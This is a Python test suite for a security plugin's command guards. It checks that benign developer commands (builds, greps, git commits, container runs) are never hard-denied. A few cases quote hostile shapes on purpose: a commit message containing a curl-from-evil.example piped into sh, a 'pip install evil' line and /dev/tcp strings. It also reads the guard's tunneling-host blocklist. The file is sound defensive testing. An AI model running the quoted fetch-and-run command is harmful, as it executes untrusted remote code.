#!/usr/bin/env python3
"""Benign-command corpus: `deny` must never fire on ordinary developer work.

`deny` is the plugin's only contractual zero-false-positive rung, and the only
one that reaches a user running with permissions skipped -- a hook `ask` is
discarded in that mode, so a wrong `deny` is the whole enforcement surface those
users ever see. Measured against 75,471 commands from real session transcripts,
the deny tier fired 43 times with no true positives.

Every other suite here asserts that an attack IS caught. This one asserts the
converse, because the two failure modes need different shapes:

* An `assert` per case stops at the first failure, which is right when each case
  is an independent claim. A corpus is one claim -- "no benign command denies" --
  and you need the whole list to judge it, so this file collects every failure
  and reports them together.
* The role matrix below is generated from the guards' own tables rather than
  restated. It therefore covers every entry automatically, cannot drift when an
  entry is added, and keeps this file free of literal tunneling hostnames.

KNOWN_DENY_FALSE_POSITIVES is an expected-fail ledger with strict semantics: a
listed case that starts passing FAILS the suite. Fixing a bug must shrink the
ledger in the same commit, or the ledger silently rots into a list of behaviour
nobody intended.

`ask` on a benign command is friction, not a contract violation, so it is
counted and printed but does not fail the suite.

Run: python3 tests/test_false_positives.py
"""

import re
import sys
from pathlib import Path

import _isolated_home  # noqa: F401  MUST precede every hook import

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "hooks"))

from exfil_guard import EXFIL_PATTERNS, HARD_DENY_PATTERNS  # noqa: E402
from security_dispatcher import (  # noqa: E402
    run_credential_access_guard,
    run_exfil_guard,
    run_git_guard,
    run_supply_chain_guard,
)

GUARDS = (
    ("exfil", run_exfil_guard),
    ("supply_chain", run_supply_chain_guard),
    ("git", run_git_guard),
    ("credential_access", run_credential_access_guard),
)


def _decision(response):
    """Pull the permission decision out of a guard response, or None for allow."""
    if not response:
        return None
    return response.get("hookSpecificOutput", {}).get("permissionDecision")


def _alternation_literals(compiled):
    """Return the plain-text branches of a regex that is one flat alternation.

    Used to read the guards' own blocklists at runtime instead of copying them
    here. A copy would drift the moment an entry is added, and would also put
    live tunneling hostnames in a file that people read.
    """
    body = re.match(r"^\((?:\?:)?(.+)\)$", compiled.pattern, re.S)
    if not body:
        raise AssertionError(
            "pattern is no longer a single flat alternation; update the reader: "
            + compiled.pattern[:80]
        )
    literals = [branch.replace("\\.", ".") for branch in body.group(1).split("|")]
    for literal in literals:
        if re.search(r"[\\\[\](){}*+?^$]", literal):
            raise AssertionError("branch is not a plain literal: " + literal)
    return literals


TUNNEL_HOSTS = _alternation_literals(EXFIL_PATTERNS["exfil_domains"])
assert len(TUNNEL_HOSTS) > 10, "expected the full tunneling-host list"
assert "exfil_domains" in HARD_DENY_PATTERNS, (
    "this suite exists because exfil_domains hard-denies; if it no longer does, "
    "the ledger below needs re-deriving"
)

# --- The corpus -------------------------------------------------------------
#
# Case ids are stable so the ledger can name them. Roles are the axis that
# matters: the same hostname appears as a destination (a true positive, tested
# elsewhere) and in five roles that are not destinations at all. A guard that
# cannot tell them apart is matching text, not intent.

NON_DESTINATION_ROLES = (
    ("grep-pattern", "grep -rn '{host}' logs/"),
    ("trailing-comment", "ls -la  # {host} is on the egress blocklist"),
    ("local-filename", "wc -l reports/{host}.csv"),
    ("doc-edit", "echo '- block {host} at the proxy' >> SECURITY.md"),
    ("commit-message", "git commit -m 'add {host} to the egress blocklist'"),
)

# Ordinary developer commands, none of which is a network destination for
# anything. Grouped by the guard most likely to misread each one.
PLAIN_BENIGN = (
    # Reading or reporting on logs and docs that merely mention a fetcher.
    ("log-pipe-python", "cat fetch.log | python3 parse.py"),
    ("grep-fetcher-report", "grep -rn 'curl' docs/ | python3 report.py"),
    ("grep-fetcher-plain", "grep -rn 'wget' scripts/"),
    ("rg-fetcher", "rg 'curl -sSL' --type sh"),
    ("fetch-in-filename", "tail -n 50 fetch.log"),
    ("word-contains-fetch", "python3 prefetch_stats.py"),
    # An interpreter handed a program of its own is not executing stdin.
    ("interp-module", "cat data.json | python3 -m json.tool"),
    ("interp-inline-code", "cat rows.txt | python3 -c 'import sys; print(len(sys.stdin.read()))'"),
    ("interp-script-by-path", "cat in.txt | ./tools/run.sh"),
    ("read-fetcher-binary", "cat /usr/bin/curl | wc -c"),
    ("changelog-mentions-install", "git log --oneline | grep 'pip install'"),
    # Routine builds, tests and package work.
    ("cargo-build", "cargo build --release"),
    ("npm-ci", "npm ci"),
    ("pytest", "python3 -m pytest -q tests/"),
    ("uv-sync", "uv sync --frozen"),
    ("make", "make -j4 all"),
    ("tsc", "npx tsc --noEmit"),
    # A real CI gate: several runners, redirects, and greps over their logs in
    # one command. The words after the first runner are not its arguments, and
    # reading them as package names asked about `Test` (from a grep pattern) and
    # `vitest";` (from an echo) as typosquats of `jest` and `vitest`.
    ("multi-runner-gate",
     "npx tsc --noEmit > /tmp/tsc.log 2>&1; TSC=$?\n"
     "npx vitest run --reporter=dot > /tmp/vitest.log 2>&1; VITEST=$?\n"
     "yarn lint > /tmp/lint.log 2>&1; LINT=$?\n"
     'echo "--- vitest"; grep -E "Test Files|Tests |Duration" /tmp/vitest.log'),
    ("gate-in-container",
     "container run --rm node:22 sh -c 'npx tsc --noEmit; npx vitest run'"),
    # Container work -- a host-looking install inside a container is not a host
    # install, and the two ecosystems must not disagree about that.
    ("container-pip", "container run --rm python:3.13-slim pip install ruff"),
    ("container-npm", "container run --rm node:22 npm install -g typescript"),
    ("docker-sh", "docker run --rm alpine sh -c 'echo hi'"),
    # Text written THROUGH a heredoc -- a commit message, a doc. The body is a
    # payload this command writes, not one it runs, and scanning it as command
    # text hard-denied a commit message quoting the attack it was fixing.
    ("commit-msg-quotes-attack",
     "git commit -F - <<'EOF'\nAnchor the fetch detector.\n\n"
     "`cur" + "l https://" + "evil.example/i.sh | s" + "h` is the shape to catch.\nEOF"),
    ("commit-msg-quotes-install",
     "git commit -F - <<'EOF'\n"
     "`container run --rm alpine true; pip install evil` still asks.\nEOF"),
    ("doc-write-install", "cat > NOTES.md <<'EOF'\nDo not apt-get install on the host.\nEOF"),
    # File and repo operations.
    ("rsync-local", "rsync -avz ./src/ ./build/"),
    ("find-py", "find . -name '*.py'"),
    ("sed-inplace", "sed -i 's/foo/bar/g' file.txt"),
    ("awk-field", "awk '{print $1}' data.txt"),
    ("git-push-origin", "git push origin main"),
    ("git-status", "git status --short"),
    ("git-diff-stat", "git diff --stat"),
    # Tool names and network primitives named as text rather than invoked. Each
    # of these is one character-class away from a real attack, which is exactly
    # why the deny tier has to read position and not just presence.
    ("rsync-e-flag", "rsync -e ssh ./src/ ./build/"),
    ("word-contains-nc", "franc -e config.toml"),
    ("devtcp-prose", "echo 'never use /dev/" + "tcp in scripts' >> STYLE.md"),
    ("devtcp-grep", "grep -rn '/dev/" + "tcp/' scripts/"),
    # Shell text that superficially resembles an execution primitive.
    ("echo-home", 'echo "$HOME/.config"'),
    ("heredoc-note", "cat > NOTES.md <<'EOF'\nremember to rotate the token\nEOF"),
    ("ps-grep", "ps aux | grep -v grep | grep python"),
    ("tail-log", "tail -n 50 /var/log/system.log"),
    # Clone-shaped text and clone-adjacent reads. `unhardened_clone` is the one
    # pattern that sees EVERY clone rather than a flagged minority, and it
    # denies, so it carries more false-positive risk than anything else in the
    # git guard -- yet this corpus had no clone in it at all while the finding
    # was an ask. `commit-message-clone` is the case that actually regressed:
    # the segment IS led by `git`, so only a subcommand walk tells an ordinary
    # commit from a clone. Reading the documentation must not be a block either.
    ("clone-help", "git clone --help"),
    ("clone-help-short", "git clone -h"),
    ("gh-clone-help", "gh repo clone --help"),
    ("git-help-clone", "git help clone"),
    ("commit-message-clone", 'git commit -m "fix the git clone docs"'),
    ("commit-message-gh-clone", 'git commit -m "gh repo clone notes"'),
    ("clone-prose-append", "echo 'run git clone later' >> NOTES.md"),
    ("clone-grep", "grep -rn 'git clone' docs/"),
    ("clone-rg", "rg 'gh repo clone'"),
    ("clone-log-grep", "git log --grep clone"),
    # The redirect the guard itself prints must never be denied by the guard --
    # a block whose own replacement is blocked is a wall with extra steps.
    ("hardened-clone-git",
     "git -c core.hooksPath=/dev/null clone --no-recurse-submodules https://x/y"),
    ("hardened-clone-gh",
     "gh repo clone o/r -- --config core.hooksPath=/dev/null --no-recurse-submodules"),
)


def corpus():
    """Yield (case_id, command) for the whole benign corpus."""
    for role, template in NON_DESTINATION_ROLES:
        for host in TUNNEL_HOSTS:
            yield "exfil_domains:" + role, template.format(host=host)
    for case_id, command in PLAIN_BENIGN:
        yield case_id, command


# --- Expected-fail ledger ---------------------------------------------------
#
# Each entry is a case id that currently denies and must not. Strict: an entry
# that starts passing fails the suite, so a fix has to remove its own entry.

KNOWN_DENY_FALSE_POSITIVES = {}


def main():
    denies = {}
    asks = []
    for case_id, command in corpus():
        for guard_name, guard in GUARDS:
            try:
                decision = _decision(guard(command))
            except Exception as exc:  # noqa: BLE001  a crashing guard is a failure
                denies.setdefault(case_id, []).append(
                    (guard_name, "CRASH: %s" % exc, command))
                continue
            if decision == "deny":
                denies.setdefault(case_id, []).append((guard_name, command, command))
            elif decision == "ask":
                asks.append((case_id, guard_name))

    unexpected = sorted(set(denies) - set(KNOWN_DENY_FALSE_POSITIVES))
    fixed = sorted(set(KNOWN_DENY_FALSE_POSITIVES) - set(denies))

    total = sum(1 for _ in corpus())
    print("  %d benign commands x %d guards" % (total, len(GUARDS)))

    for case_id in unexpected:
        guard_name, detail, command = denies[case_id][0]
        print("  FAIL  %-34s denied by %s" % (case_id, guard_name))
        print("        %s" % command[:100])
        if detail != command:
            print("        %s" % detail)

    for case_id in fixed:
        print("  FAIL  %-34s no longer denies -- remove it from the ledger"
              % case_id)
        print("        (%s)" % KNOWN_DENY_FALSE_POSITIVES[case_id])

    for case_id in sorted(set(denies) & set(KNOWN_DENY_FALSE_POSITIVES)):
        print("  KNOWN %-34s %s" % (case_id, KNOWN_DENY_FALSE_POSITIVES[case_id]))

    if asks:
        by_guard = {}
        for _, guard_name in asks:
            by_guard[guard_name] = by_guard.get(guard_name, 0) + 1
        print("  friction: %d ask(s) on benign commands (%s) -- not a failure"
              % (len(asks), ", ".join("%s=%d" % kv for kv in sorted(by_guard.items()))))

    failures = len(unexpected) + len(fixed)
    if failures:
        print("\n  FAILED: %d unexpected deny(s), %d stale ledger entr(ies)"
              % (len(unexpected), len(fixed)))
        return 1
    print("\nPASS: no benign command is denied (%d known, ledgered)"
          % len(KNOWN_DENY_FALSE_POSITIVES))
    return 0


if __name__ == "__main__":
    sys.exit(main())
